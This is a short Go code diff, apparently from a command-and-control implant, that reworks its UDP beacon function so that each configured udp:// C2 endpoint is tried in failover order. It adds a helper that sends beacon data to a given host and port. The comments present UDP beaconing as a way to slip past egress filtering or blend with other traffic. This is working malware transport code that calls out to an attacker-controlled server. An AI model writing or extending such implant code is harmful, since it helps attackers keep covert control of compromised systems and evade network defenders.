@@ -14,19 +14,18 @@ import (
 // a low-overhead, connectionless beacon transport for environments where UDP
 // egress is permitted (or to blend with other UDP traffic). The server must
 // expose a matching UDP listener that understands the same v2 envelope framing.
+// Every configured udp:// endpoint is tried in failover order.
 //
 // Fragmentation/ordering are the caller's concern: the payload is sent in one
 // datagram, so keep it within the link MTU; larger results must use a
 // connection-oriented transport.
 func sendUDPBeacon(body []byte) []byte {
-	hostPort, scheme, ok := currentC2Dial()
-	if !ok || (scheme != "" && scheme != "udp") {
-		if Debug {
-			fmt.Printf("[!] UDP beacon: no udp:// endpoint configured (scheme=%s)\n", scheme)
-		}
-		return nil
-	}
+	return forEachC2Endpoint("udp", func(_ int, _ string, hostPort, _ string) []byte {
+		return sendUDPBeaconAt(hostPort, body)
+	})
+}
 
+func sendUDPBeaconAt(hostPort string, body []byte) []byte {
 	addr, err := net.ResolveUDPAddr("udp", hostPort)
 	if err != nil {
 		if Debug {
